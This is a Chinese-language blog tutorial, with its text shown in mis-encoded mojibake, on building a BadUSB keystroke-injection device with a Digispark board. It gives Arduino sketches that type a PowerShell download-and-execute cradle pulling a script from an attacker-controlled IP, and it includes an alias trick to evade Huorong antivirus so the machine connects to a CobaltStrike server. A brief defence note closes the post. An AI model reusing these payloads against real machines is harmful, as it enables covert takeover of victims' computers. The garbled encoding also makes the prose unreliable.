---
title: è¿‘æºæ¸—é€ä¹‹BadUSB
date: 2023/10/7 19:48:25
categories:
- æ¸—é€æµ‹è¯•
tags:
- è¿‘æºæ¸—é€
---
# åŸç†

**è¯ç”Ÿ**

åœ¨2014å¹´çš„BlackHatå¤§ä¼šä¸Šï¼Œä¿¡æ¯å®‰å…¨ä¸“å®¶å±•ç¤ºäº†ä¸€ç§æ–°çš„ç½‘ç»œå®‰å…¨å¨èƒï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºBadUSBï¼Œå®é™…ä¸Šæ˜¯HIDæ”»å‡»ï¼Œè¯¥æ¼æ´ç”±Karsten Nohlå’ŒJakob Lellå…±åŒå‘ç°ã€‚



**HID**

HIDæ˜¯"Human Interface Device"çš„ç¼©å†™ï¼Œä¸­æ–‡æ„ä¸º"äººæœºæ¥å£è®¾å¤‡"ã€‚HIDæ˜¯ä¸€ç§ç”¨äºè®¡ç®—æœºå’Œå…¶ä»–ç”µå­è®¾å¤‡ä¹‹é—´è¿›è¡Œäº¤äº’çš„æ ‡å‡†åŒ–åè®®å’Œæ¥å£ã€‚HIDåŒ…æ‹¬å¤šç§è¾“å…¥å’Œè¾“å‡ºè®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ã€æ¸¸æˆæ‰‹æŸ„ã€è§¦æ‘¸å±ã€æ‰«æä»ªç­‰ã€‚è¿™äº›è®¾å¤‡é€šè¿‡HIDåè®®ä¸è®¡ç®—æœºé€šä¿¡ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡è¿™äº›è®¾å¤‡ä¸è®¡ç®—æœºè¿›è¡Œäº¤äº’æ“ä½œã€‚



**HIDæ”»å‡»**

ä¸€èˆ¬æ¥è®²é’ˆå¯¹HIDçš„æ”»å‡»ä¸»è¦é›†ä¸­åœ¨é”®ç›˜é¼ æ ‡ä¸Šï¼Œå› ä¸ºåªè¦æ§åˆ¶äº†ç”¨æˆ·é”®ç›˜ï¼ŒåŸºæœ¬ä¸Šå°±ç­‰äºæ§åˆ¶äº†ç”¨æˆ·çš„ç”µè„‘ã€‚æ”»å‡»è€…ä¼šæŠŠæ”»å‡»éšè—åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¼ æ ‡é”®ç›˜ä¸­ï¼Œå½“ç”¨æˆ·å°†**å«æœ‰æ”»å‡»å‘é‡çš„é¼ æ ‡æˆ–é”®ç›˜æ’å…¥ç”µè„‘**æ—¶ï¼Œ**æ¶æ„ä»£ç ä¼šè¢«åŠ è½½å¹¶æ‰§è¡Œ**ã€‚



**BadUsbçš„ç»“æ„**

BadUsbçš„å†…éƒ¨ç»“æ„å¦‚ä¸‹

![image.png](../images/942cb02d-5333-4938-85ac-973f4c867ef4.png)

å¯ä»¥çœ‹åˆ°ï¼ŒUç›˜å¤§è‡´ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯èŠ¯ç‰‡å¼•å¯¼ç¨‹åºï¼Œä¸€éƒ¨åˆ†æ˜¯é—ªå­˜åŒºåŸŸã€‚

æ§åˆ¶å™¨è´Ÿè´£ä¸PCçš„é€šè®¯å’Œè¯†åˆ«ï¼Œé—ªå­˜ç”¨æ¥åšæ•°æ®å­˜å‚¨ï¼›

é—ªå­˜ä¸­æœ‰ä¸€éƒ¨åˆ†åŒºåŸŸç”¨æ¥å­˜æ”¾Uç›˜çš„å›ºä»¶ï¼Œå®ƒçš„ä½œç”¨ç±»ä¼¼äºæ“ä½œç³»ç»Ÿï¼Œæ§åˆ¶è½¯ç¡¬ä»¶äº¤äº’ï¼›



**BadUsbæ”»å‡»**

BadUsbçš„æ”»å‡»ä¸HIDæ”»å‡»ç±»ä¼¼ï¼Œä¹Ÿæ˜¯æ’å…¥ç”µè„‘ååŠ è½½å¹¶æ‰§è¡Œæ¶æ„ä»£ç ä»è€Œå®Œæˆæ”»å‡»ã€‚

BadUsbæ’å…¥PCåï¼Œä¼šæ¨¡æ‹Ÿå‡ºä¸€ä¸ªè™šæ‹Ÿé”®ç›˜ï¼ŒåŒæ—¶æ‰§è¡Œæˆ‘ä»¬äº‹å…ˆå†™å…¥åˆ°å›ºä»¶ä¸­çš„ä»£ç æ¥æ•²å‡»ç›¸åº”çš„æŒ‰é”®ï¼Œè¾“å…¥æ”»å‡»ä»£ç ä»è€Œå®Œæˆä¸€äº›æ¶æ„è¡Œä¸ºã€‚



**BadUsbä¼˜åŠ¿**

- åªéœ€è¦ä½¿ç”¨é€šç”¨çš„USBè®¾å¤‡ï¼ˆæ¯”å¦‚Uç›˜ï¼‰å°±å¯ä»¥å®ŒæˆHIDæ”»å‡»ã€‚
- æ¶æ„ä»£ç çƒ§å½•åˆ°å›ºä»¶ä¸­ï¼Œè€Œè¿™éƒ¨åˆ†åŒºåŸŸæ˜¯æ€æ¯’è½¯ä»¶æ— æ³•è®¿é—®çš„åŒºåŸŸï¼Œå› æ­¤å¤§éƒ¨åˆ†æ€æ¯’è½¯ä»¶æ˜¯æ ¹æœ¬æ— æ³•åº”å¯¹BadUsbæ”»å‡»çš„



**å¸¸è§æ”»å‡»åœºæ™¯**

é»‘å®¢æ•…æ„å°†å†™å…¥äº†æ¶æ„ç¨‹åºçš„BadUsbä¸¢åœ¨æŸä¸ªåœºæ‰€é‡Œï¼Œå¦‚æœæœ‰äººå› ä¸ºå¥½å¥‡å¿ƒå°†BadUsbæ’å…¥ç”µè„‘ä¸­ï¼Œé‚£ä¹ˆå…¶ä¸­çš„æ¶æ„ç¨‹åºå°±ä¼šè¿è¡Œï¼Œé»‘å®¢ä»è€Œå¯ä»¥æ§åˆ¶è¿™ä¸ªäººçš„ç”µè„‘ã€‚æ¯”å¦‚æŠ¤ç½‘è¡ŒåŠ¨ï¼Œå¥½å¥‡çš„è“æ–¹äººå‘˜çš„ç”µè„‘è¢«çº¢æ–¹äººå‘˜ä»¥è¿™ç§æ–¹å¼æ§åˆ¶ğŸ˜¨ã€‚



# å·¥å…·å‡†å¤‡

- æŸå®å¼€å‘æ¿ï¼ˆå…³é”®è¯digisparkï¼‰

  ![](../images/image-20231007114326582.png)

- Ardunio IDE

  ä¸‹è½½åœ°å€https://www.arduino.cc/en/software

  ä¸‹è½½å®Œåæ‰“å¼€Arduino IDE-->æ–‡ä»¶-->é¦–é€‰é¡¹-->é™„åŠ ç®¡ç†å™¨ç½‘å€ï¼šhttp://digistump.com/package_digistump_index.json

  ![image-20231007130123285](../images/image-20231007130123285.png)

  å·¥å…·-->å¼€å‘æ¿-->å¼€å‘æ¿ç®¡ç†å™¨-->å®‰è£…`Digistump AVR` è½¯ä»¶åŒ…

  ![image-20231007130250973](../images/image-20231007130250973.png)

- Digisparké©±åŠ¨

  https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7

- CobaltStrike



# å¼€å‘æ¿è¿æ¥

æ¿å­æˆåŠŸè¿æ¥ç”µè„‘åï¼Œå¯ä»¥åœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­çœ‹åˆ°

![image-20231007130836961](../images/image-20231007130836961.png)

é‡åˆ°ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™ç©æ„æ’ä¸Šå»æ²¡æœ‰æ˜¾ç¤ºç«¯å£ï¼ŒArdunioè¿æ¥ä¸äº†ï¼Œè€Œä¸”ä¸€ç›´é—ªçº¢ç¯ğŸ˜¢ã€‚

ç»è¿‡æœç´¢æ‰çŸ¥é“, è¿™å—æ¿å­æ¥ä¸Šç”µæºåªä¿æŒ `5s` çš„è¿æ¥, ç„¶åè‡ªåŠ¨è¿è¡Œæ¿å­å†…çš„ç¨‹åºã€‚

æ‰€ä»¥æ­£ç¡®çš„çƒ§å½•æ–¹å¼æ˜¯å…ˆç‚¹å‡»ä¸Šä¼ , ç­‰åˆ°ç»ˆç«¯æç¤ºæ¥å…¥è®¾å¤‡çš„æ—¶å€™, å†æ¥å…¥è®¾å¤‡çƒ§å½•ç¨‹åºã€‚

![image-20231007130725980](../images/image-20231007130725980.png)



# DigiKeyboard.hä½¿ç”¨

ä¸»è¦åˆ©ç”¨è¯¥åº“æ¥æ¨¡æ‹Ÿé”®ç›˜å’Œé¼ æ ‡è¾“å…¥

åœ¨githubä¸Šæ‰¾åˆ°äº†æ•°å­—æŒ‰é”®è¡¨

![KeyCodes](../images/68747470733a2f2f736372697074656c2e636f6d2f4b6579626f617264456d756c6174696f6e4150492f4a6176615363726970742f696d616765732f6b6579626f6172642d6964656e746966696572732e706e67)

é¢„è®¾å¸¸é‡

https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h

å¸¸ç”¨å‡½æ•°

```c
DigiKeyboard.println("text"); # ç”¨äºå‘æ¨¡æ‹Ÿé”®ç›˜å‘é€æ–‡æœ¬å¹¶åœ¨è®¡ç®—æœºä¸Šè¾“å…¥ä¸€è¡Œå­—ç¬¦å¹¶è‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå›è½¦ç¬¦

DigiKeyboard.sendKeyStroke(key); # ç”¨äºæ¨¡æ‹ŸæŒ‰ä¸‹å’Œé‡Šæ”¾ä¸€ä¸ªæŒ‡å®šçš„æŒ‰é”®

DigiKeyboard.delay(ms) # ç”¨äºåœ¨æ‰§è¡Œåç»­æ“ä½œå‰æš‚åœä¸€æ®µæ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’
```





# å¼¹è®¡ç®—å™¨

Arduinoä»£ç 

```c
#include "DigiKeyboard.h"
String a;
String b;
String c;

void setup() {
DigiKeyboard.sendKeyStroke(0);

DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(57); // å¼€å¯CapsLockå¤§å†™é”å®šé”®ç»•è¿‡ä¸­æ–‡è¾“å…¥æ³•é—®é¢˜(windowså¤§å°å†™ä¸æ•æ„Ÿ)
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // æŒ‰ä¸‹Win+Ré”®
DigiKeyboard.delay(800);
DigiKeyboard.println("calc"); // æ‰“å¼€è®¡ç®—å™¨
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(57); // å…³é—­CapsLockå¤§å†™é”å®šé”®
 
}

void loop() {
   
}
```

![åŠ¨ç”»](../images/åŠ¨ç”».gif)



# PowerShell  Bypassç«ç»’ä¸Šçº¿CS

[å¹²è´§ | æˆ‘çš„powershellå…æ€ä¹‹è·¯ (qq.com)](https://mp.weixin.qq.com/s/5Bx9fYiI_mK2yimSsDyhoA)

åŸå§‹payload

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.23.102:8000/one_liner.ps1'))"
```

![image-20231007134142125](../images/image-20231007134142125.png)

Bypass

```powershell
powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1')
```

è½¬åŒ–ä¸ºArduinoä»£ç 

```c
#include "DigiKeyboard.h"
String a;
String b;
String c;

void setup() {
DigiKeyboard.sendKeyStroke(0);

DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(57);//å¼€å¯CapsLockå¤§å†™é”å®šé”®
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//æŒ‰ä¸‹Win+Ré”®
DigiKeyboard.delay(800);
DigiKeyboard.println("powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1')");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(57);//å…³é—­CapsLockå¤§å†™é”å®šé”®
 
}

void loop() {
   
}
```

![22](../images/22.gif)



# é˜²å¾¡

ç”±äºæ¶æ„ä»£ç å†…ç½®äºè®¾å¤‡åˆå§‹åŒ–å›ºä»¶ä¸­ï¼Œè€Œä¸æ˜¯é€šè¿‡autorun.infç­‰åª’ä½“è‡ªåŠ¨æ’­æ”¾æ–‡ä»¶è¿›è¡Œæ§åˆ¶ï¼Œå› æ­¤æ— æ³•é€šè¿‡ç¦ç”¨åª’ä½“è‡ªåŠ¨æ’­æ”¾è¿›è¡Œé˜²å¾¡ï¼Œæ€æ¯’è½¯ä»¶æ›´æ˜¯æ— æ³•æ£€æµ‹è®¾å¤‡å›ºä»¶ä¸­çš„æ¶æ„ä»£ç ã€‚ç›®å‰ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„æ–¹å¼å»é˜²å¾¡BadUSBï¼Œæ¯•ç«Ÿæ— æ³•é˜»æŒ¡ç”µè„‘å»è¯†åˆ«é”®ç›˜é¼ æ ‡æ­¤ç±»çš„HIDè®¾å¤‡ã€‚æ‰€ä»¥è¯´é’ˆå¯¹BadUSBçš„é˜²å¾¡æ–¹æ³•è¿˜æ˜¯åœ¨äºäººå‘˜çš„å®‰å…¨æ„è¯†ä¸Šï¼Œå½“å‘ç°å¯ç–‘çš„Uç›˜æ—¶åˆ‡è«å› å¥½å¥‡æ’å…¥è‡ªå·±çš„ç”µè„‘ã€‚